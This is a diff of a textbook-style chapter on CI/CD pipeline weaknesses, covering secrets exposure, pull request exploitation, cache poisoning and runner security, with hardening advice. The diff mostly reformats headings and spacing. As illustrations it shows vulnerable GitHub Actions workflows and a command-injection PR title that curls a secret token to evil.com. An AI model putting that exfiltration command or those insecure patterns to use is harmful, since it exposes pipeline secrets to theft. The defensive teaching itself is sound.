@@ -4,7 +4,7 @@ The case studies in preceding sections—SolarWinds, 3CX, Codecov, XZ Utils—de
 
 This section provides a taxonomy of CI/CD security weaknesses, drawing on the **OWASP CI/CD Security Top 10** framework and research from security organizations studying build pipeline risks. Each vulnerability category includes examples, detection approaches, and hardening recommendations.
 
-#### A Systematic Overview of CI/CD Weaknesses
+## A Systematic Overview of CI/CD Weaknesses
 
 Modern CI/CD systems automate software building, testing, and deployment. This automation provides enormous productivity benefits but concentrates risk: pipelines have access to source code, secrets, build infrastructure, and production systems. A compromised pipeline can affect every release it produces.
 
@@ -23,7 +23,7 @@ The OWASP CI/CD Security Top 10 identifies the most critical pipeline vulnerabil
 
 We will examine the most prevalent of these throughout this section.
 
-#### Secrets Exposure
+## Secrets Exposure
 
 CI/CD pipelines handle numerous secrets: API keys, deployment credentials, signing keys, database passwords, and access tokens. Improper handling exposes these secrets to attackers.
 
@@ -37,6 +37,7 @@ Build logs capture pipeline output for debugging. Unfortunately, they often capt
 - Test output that reveals API responses
 
 Many CI/CD platforms attempt to redact known secrets, but redaction is imperfect:
+
 - Secrets may be printed in non-standard formats
 - Base64 or hex-encoded secrets may not be recognized
 - Partial secrets or secret derivatives may be logged
@@ -64,7 +65,7 @@ The Codecov attack (Section 7.4) exploited environment variable access. Any code
 4. Audit artifact contents for secret exposure before publication
 5. Configure pipelines to fail if secrets are detected in output
 
-#### Insufficient Access Controls
+## Insufficient Access Controls
 
 Pipelines often run with excessive privileges, creating opportunities for escalation:
 
@@ -98,7 +99,7 @@ When any one pipeline is compromised, all systems accessible through shared cred
 4. Regularly audit and rotate credentials
 5. Use OIDC federation instead of long-lived tokens where supported
 
-#### Pull Request Exploitation
+## Pull Request Exploitation
 
 Open source projects and organizations allowing external contributions face a challenging problem: pull requests may contain malicious code, but testing requires executing that code.
 
@@ -122,10 +123,14 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+
       - uses: actions/checkout@v4
+
         with:
           ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code
+
       - run: npm install  # Runs attacker's postinstall scripts with secrets
+
 ```
 
 This pattern gives the PR author's code access to repository secrets. Attackers can submit PRs that exfiltrate secrets through malicious build scripts.
@@ -136,7 +141,9 @@ GitHub Actions workflows can be vulnerable to code injection through expression 
 
 ```yaml
 # DANGEROUS: Untrusted input directly in run command
+
 - run: echo "Building ${{ github.event.pull_request.title }}"
+
 ```
 
 If a PR title contains shell metacharacters or command injection payloads, they may be executed. An attacker could craft a PR with title `` `curl http://evil.com/steal?token=$SECRET` `` and achieve command execution.
@@ -151,7 +158,7 @@ If a PR title contains shell metacharacters or command injection payloads, they 
 4. Implement workflow review requirements for changes to CI configuration
 5. Use `permissions:` to minimize workflow token scope
 
-#### Dependency Caching Vulnerabilities
+## Dependency Caching Vulnerabilities
 
 CI/CD systems cache dependencies to accelerate builds. These caches create attack surfaces when shared across security boundaries.
 
@@ -169,7 +176,9 @@ Caches keyed only on filenames or partial hashes may be vulnerable:
 
 ```yaml
 # Potentially vulnerable: cache keyed only on lockfile
+
 - uses: actions/cache@v4
+
   with:
     path: ~/.npm
     key: npm-${{ hashFiles('package-lock.json') }}
@@ -197,19 +206,21 @@ Some CI systems share caches across branches. An attacker with access to any bra
 4. Set appropriate cache lifetimes
 5. Consider cache-less builds for security-critical pipelines
 
-#### Self-Hosted vs. Cloud-Hosted Runners
+## Self-Hosted vs. Cloud-Hosted Runners
 
 Organizations choose between self-hosted CI/CD runners and cloud-provided managed runners. Each model has distinct security properties:
 
 **Cloud-Hosted Runners:**
 
 *Advantages:*
+
 - Fresh, ephemeral environment for each job
 - Provider handles security patching
 - No infrastructure management burden
 - Isolation between customer workloads
 
 *Risks:*
+
 - Shared infrastructure (potential for cross-tenant attacks)
 - Limited customization of security controls
 - Provider is a trust point
@@ -218,12 +229,14 @@ Organizations choose between self-hosted CI/CD runners and cloud-provided manage
 **Self-Hosted Runners:**
 
 *Advantages:*
+
 - Full control over environment and security configuration
 - No shared tenancy with other organizations
 - Custom network controls and monitoring
 - Access to internal resources without exposure
 
 *Risks:*
+
 - Persistent environment (state survives between jobs)
 - Organization must handle security patching
 - Compromise persists until detected
@@ -250,7 +263,7 @@ Many self-hosted runner configurations default to persistent mode for performanc
 5. Implement container isolation even on self-hosted infrastructure
 6. Audit runner configurations for security misconfigurations
 
-#### Pipeline-as-Code Security
+## Pipeline-as-Code Security
 
 Modern CI/CD systems define pipelines as code—YAML files, scripts, or configuration that lives in repositories alongside application code. This brings software development practices to pipeline management but also creates security considerations.
 
@@ -267,7 +280,9 @@ If attackers can modify pipeline definitions, they control what runs during buil
 Pipelines often use third-party actions or orbs:
 
 ```yaml
+
 - uses: some-org/some-action@v1  # What does this do?
+
 ```
 
 These components execute with the pipeline's privileges. A compromised third-party action affects every workflow using it.
@@ -278,10 +293,13 @@ These components execute with the pipeline's privileges. A compromised third-par
 
 ```yaml
 # RISKY: Tag can be moved to point to different code
+
 - uses: some-action@v1
 
 # SAFER: SHA pinning ensures specific version
+
 - uses: some-action@a1b2c3d4e5f6...
+
 ```
 
 Using tags rather than commit SHAs for actions allows maintainers (or attackers who compromise them) to change what code runs without changing the workflow file.
@@ -295,7 +313,7 @@ Using tags rather than commit SHAs for actions allows maintainers (or attackers 
 5. Use workflow linting tools to detect common misconfigurations
 6. Monitor for unexpected pipeline definition changes
 
-#### Cache Poisoning Attacks in Depth
+## Cache Poisoning Attacks in Depth
 
 Cache poisoning deserves detailed treatment as an increasingly exploited vector:
 
@@ -323,6 +341,7 @@ GitHub Actions caches are keyed partially on the action repository. If an attack
 **Detection Challenges:**
 
 Cache poisoning is difficult to detect because:
+
 - Cached content is expected to be executed
 - No visibility into cache provenance
 - No comparison between cached and fresh content
@@ -337,7 +356,7 @@ Cache poisoning is difficult to detect because:
 5. **Periodic cache invalidation**: Limit cache lifetime to reduce poisoning windows
 6. **Zero-cache verification builds**: Periodically build without caches and compare results
 
-#### CI/CD Security Scanning Tools
+## CI/CD Security Scanning Tools
 
 Several tools help identify CI/CD vulnerabilities:
 
@@ -353,7 +372,7 @@ Several tools help identify CI/CD vulnerabilities:
 
 **[Cycode][cycode]** offers platform for detecting secrets and misconfigurations in CI/CD systems.
 
-#### Recommendations for CI/CD Hardening
+## Recommendations for CI/CD Hardening
 
 Based on the vulnerability categories examined:
 
